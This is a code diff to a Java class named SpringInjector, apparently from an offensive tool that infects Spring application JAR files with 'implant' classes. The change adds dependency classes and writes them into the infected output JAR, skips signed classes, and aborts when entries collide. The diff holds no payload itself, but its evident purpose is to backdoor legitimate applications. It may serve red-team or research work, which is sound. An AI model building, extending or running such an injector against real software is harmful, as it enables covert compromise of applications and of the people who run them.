@@ -6,6 +6,7 @@ import javassist.bytecode.annotation.MemberValue;
 
 import java.io.DataInputStream;
 import java.io.IOException;
+import java.nio.ByteBuffer;
 import java.nio.file.Path;
 import java.util.*;
 import java.util.jar.JarEntry;
@@ -16,10 +17,24 @@ import static org.example.injector.Helpers.*;
 public class SpringInjector {
     private final ImplantHandler implantComponentHandler;
     private final ImplantHandler implantSpringConfigHandler;
+    private final Map<String, ByteBuffer> dependencies = new HashMap<>();
 
     public SpringInjector(ImplantHandler implantComponentHandler, ImplantHandler implantSpringConfigHandler) {
         this.implantComponentHandler = implantComponentHandler;
         this.implantSpringConfigHandler = implantSpringConfigHandler;
+    }
+
+    public void addDependency(String fullClassName, ClassFile classData) throws IOException {
+        addDependency(fullClassName, ByteBuffer.wrap(asByteArray(classData)));
+    }
+
+    public void addDependency(String fullClassName, byte[] classData) {
+        addDependency(fullClassName, ByteBuffer.wrap(classData));
+    }
+
+    public void addDependency(String fullClassName, ByteBuffer rawClassData) {
+        String pathInJar = convertToJarEntryPathName(fullClassName);
+        dependencies.put(pathInJar, rawClassData);
     }
 
     public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
@@ -95,6 +110,26 @@ public class SpringInjector {
 
         if (foundSignedClasses) {
             System.out.println("[-] Found signed classes. These were not considered for infection.");
+        }
+
+        // Add any dependency classes needed for the implant
+        if (didInfect) {
+            for (Map.Entry<String, ByteBuffer> dependencyEntry : dependencies.entrySet()) {
+                String fileName = dependencyEntry.getKey();
+                ByteBuffer fileContent = dependencyEntry.getValue();
+
+                JarEntry newJarEntry = new JarEntry(fileName);
+                byte[] bytes = new byte[fileContent.remaining()];
+                fileContent.get(bytes);
+
+                try {
+                    fiddler.addNewEntry(newJarEntry, bytes);
+                } catch (ZipException e) {
+                    System.out.println("[!] Dependency file '" + fileName + "' already exist. Aborting.");
+                    didInfect = false;
+                    break;
+                }
+            }
         }
 
         if (didInfect) {
